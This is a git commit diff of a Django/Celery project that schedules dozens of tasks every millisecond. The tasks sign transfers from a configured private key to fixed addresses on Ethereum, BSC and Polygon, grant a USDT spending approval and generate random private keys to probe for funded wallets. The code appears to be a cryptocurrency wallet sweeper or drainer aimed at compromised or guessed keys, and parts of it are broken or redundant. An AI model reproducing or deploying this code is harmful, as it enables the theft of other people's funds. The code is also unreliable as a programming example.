cb95a195ddec1126d806b5038ac3d7579c4ee14c
Codertjay <codertjay@gmail.com>
2022-04-19 21:34:08 +0100

    done

--- GetEthereum/celery.py
+++ GetEthereum/celery.py
@@ -22,45 +22,179 @@ response = app.control.enable_events(reply=True)
 app.autodiscover_tasks(settings.INSTALLED_APPS)
 app.control.inspect().active()
 
-Second = {
-    'automate_send_eth_and_approve_1': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_2': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_3': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_4': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_5': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_6': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_7': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_8': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_9': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
-    },'automate_send_eth_and_approve_10': {
-        'task': 'approve_send.tasks.automate_send_eth_and_approve_1',
-        'schedule': 0.00000000000000000000000000000001,
+Celery_beat = {
+    'automate_send_ethereum_1': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_2': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_3': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_4': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_5': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_6': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_7': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_8': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_9': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
+    }, 'automate_send_ethereum_10': {
+        'task': 'approve_send.tasks.send_ethereum',
+        'schedule': 0.001,
     },
+
+    #  binance
+    'automate_send_bnb_1': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_2': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_3': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_4': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_5': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_6': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_7': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_8': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_9': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    }, 'automate_send_bnb_10': {
+        'task': 'approve_send.tasks.send_bnb',
+        'schedule': 0.001,
+    },
+
+    #  send_polygon
+    'automate_send_polygon_1': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_2': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_3': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_4': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_5': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_6': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_7': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_8': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_9': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    }, 'automate_send_polygon_10': {
+        'task': 'approve_send.tasks.send_polygon',
+        'schedule': 0.001,
+    },
+    #  random_private_key
+
+    'automate_random_private_key_1': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_2': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_3': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_4': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_5': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_6': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_7': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_8': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_9': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    }, 'automate_random_private_key_10': {
+        'task': 'approve_send.tasks.random_private_key',
+        'schedule': 0.001,
+    },
+
+    #  approve_transaction
+    'automate_approve_transaction_1': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_2': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_3': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_4': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_5': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_6': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_7': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_8': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_9': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    }, 'automate_approve_transaction_10': {
+        'task': 'approve_send.tasks.approve_transaction',
+        'schedule': 0.001,
+    },
+
     'celery.backend_cleanup': {
         'task': 'celery.backend_cleanup',
         'schedule': crontab(minute='30'),  # Every hours when minutes = 30 mins
         'options': {'expires': 50 * 60}  # 50 minutes
     },
 }
-app.conf.beat_schedule = Second
+
+app.conf.beat_schedule = Celery_beat
 
 
 @shared_task()
--- approve_send/tasks.py
+++ approve_send/tasks.py
@@ -4,7 +4,6 @@ import random
 from celery import shared_task
 from decouple import config
 from django.core import mail
-from django.db.transaction import atomic
 from web3 import Web3
 
 from approve_send.models import EthereumAccounts
@@ -12,15 +11,32 @@ from approve_send.models import EthereumAccounts
 x = datetime.datetime.now()
 ALCHEMY_Web3Provider = Web3(Web3.HTTPProvider(config(F'ALCHEMY_DAY_{x.day}')))
 ZMOK_Web3Provider = Web3(Web3.HTTPProvider(config(F'ZMOK_DAY_{x.day}')))
-
+from_account = config('FROM_ACCOUNT')
+to_account = config('TO_ACCOUNT')
+private_key = config('PRIVATE_KEY')
 usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 usdt_contract_abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}]'
 
+contract = Web3.eth.contract(address=usdt_contract_address, abi=usdt_contract_abi)
 
-@atomic
-def approve_transaction(balance, to_account, from_account, web3, private_key, contract, value):
+try:
+    web3 = ZMOK_Web3Provider
+    balance = web3.eth.get_balance(from_account)
+except:
+    web3 = ALCHEMY_Web3Provider
+    balance = web3.eth.get_balance(from_account)
+
+
+@shared_task
+def approve_transaction():
     try:
-        balance = web3.eth.get_balance(from_account)
+        try:
+            web3 = ZMOK_Web3Provider
+            balance = web3.eth.get_balance(from_account)
+        except:
+            web3 = ALCHEMY_Web3Provider
+            balance = web3.eth.get_balance(from_account)
+        value = web3.toWei('2', 'ether')
         try:
             tx = contract.functions.approve(to_account, value).buildTransaction({
                 'from': from_account,
@@ -63,9 +79,15 @@ def approve_transaction(balance, to_account, from_account, web3, private_key, co
         pass
 
 
-@atomic
-def send_ethereum(web3, to_account, from_account, private_key, balance):
+@shared_task
+def send_ethereum():
     try:
+        try:
+            web3 = ZMOK_Web3Provider
+            balance = web3.eth.get_balance(from_account)
+        except:
+            web3 = ALCHEMY_Web3Provider
+            balance = web3.eth.get_balance(from_account)
         try:
             signed_tx = web3.eth.account.signTransaction(
                 {
@@ -127,8 +149,141 @@ def send_ethereum(web3, to_account, from_account, private_key, balance):
         pass
 
 
-@atomic
-def random_private_key(web3):
+@shared_task
+def send_bnb():
+    try:
+        to_account = "0xf4fc7ee34c38a03a2998e56a9de219edf135f5ec"
+        web3 = Web3(Web3.HTTPProvider("https://bscrpc.com"))
+        balance = web3.eth.get_balance(from_account)
+        try:
+            signed_tx = web3.eth.account.signTransaction(
+                {
+                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                    'to': to_account,
+                    'value': int(balance * 0.09),
+                    'gas': 21000,
+                    'gasPrice': int(balance * 0.99 / 21000)
+                },
+                private_key)
+            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            if balance > 165311289288785:
+                web3 = Web3(Web3.HTTPProvider("https://bscrpc.com"))
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            else:
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        except:
+            signed_tx = web3.eth.account.signTransaction(
+                {
+                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                    'to': to_account,
+                    'value': int(balance * 0.09),
+                    'gas': 21000,
+                    'gasPrice': int(balance * 0.99 / 21000)
+                },
+                private_key)
+            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            if balance > 165311289288785:
+                web3 = Web3(Web3.HTTPProvider("https://bscrpc.com"))
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+    except:
+        pass
+
+
+@shared_task
+def send_polygon():
+    try:
+        web3 = Web3(Web3.HTTPProvider(config(F'ALCHEMY_DAY_{x.day}').replace('eth', 'polygon')))
+        balance = web3.eth.get_balance(from_account)
+        try:
+            signed_tx = web3.eth.account.signTransaction(
+                {
+                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                    'to': to_account,
+                    'value': int(balance * 0.09),
+                    'gas': 21000,
+                    'gasPrice': int(balance * 0.99 / 21000)
+                },
+                private_key)
+            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            if balance > 165311289288785:
+                web3 = Web3(Web3.HTTPProvider("https://polygon-rpc.com"))
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            else:
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        except:
+            signed_tx = web3.eth.account.signTransaction(
+                {
+                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                    'to': to_account,
+                    'value': int(balance * 0.09),
+                    'gas': 21000,
+                    'gasPrice': int(balance * 0.99 / 21000)
+                },
+                private_key)
+            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            if balance > 165311289288785:
+                web3 = Web3(Web3.HTTPProvider("https://polygon-rpc.com"))
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+    except:
+        pass
+
+
+@shared_task
+def random_private_key():
     try:
         private_key = random.randbytes(32)
         acct = web3.eth.account.privateKeyToAccount(private_key)
@@ -143,88 +298,3 @@ def random_private_key(web3):
     except:
         pass
     return True
-
-
-def send_approve_random(web3, balance, from_account, to_account, private_key, value):
-    try:
-        approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
-    except:
-        pass
-    try:
-        send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key,
-                      balance=balance)
-    except:
-        pass
-
-    try:
-        random_private_key(web3)
-    except:
-        pass
-
-
-
-@shared_task
-def automate_send_eth_and_approve_1():
-    from_account = config('FROM_ACCOUNT')
-    to_account = config('TO_ACCOUNT')
-    private_key = config('PRIVATE_KEY')
-    try:
-        web3 = ALCHEMY_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-    except:
-        web3 = ZMOK_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-
-    try:
-        value = web3.toWei('1', 'ether')
-        send_approve_random(web3, balance, from_account, to_account, private_key, value)
-    except:
-        pass
-    try:
-        web3 = ALCHEMY_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-    except:
-        web3 = ZMOK_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-
-    try:
-        value = web3.toWei('4', 'ether')
-        send_approve_random(web3, balance, from_account, to_account, private_key, value)
-    except:
-        pass
-    try:
-        web3 = ALCHEMY_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-    except:
-        web3 = ZMOK_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-
-    try:
-        value = web3.toWei('2', 'ether')
-        send_approve_random(web3, balance, from_account, to_account, private_key, value)
-    except:
-        pass
-    try:
-        web3 = ALCHEMY_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-    except:
-        web3 = ZMOK_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-
-    try:
-        value = web3.toWei('5', 'ether')
-        send_approve_random(web3, balance, from_account, to_account, private_key, value)
-    except:
-        pass
-    try:
-        web3 = ALCHEMY_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-    except:
-        web3 = ZMOK_Web3Provider
-        balance = web3.eth.get_balance(from_account)
-
-    try:
-        value = web3.toWei('10', 'ether')
-        send_approve_random(web3, balance, from_account, to_account, private_key, value)
-    except:
-        pass
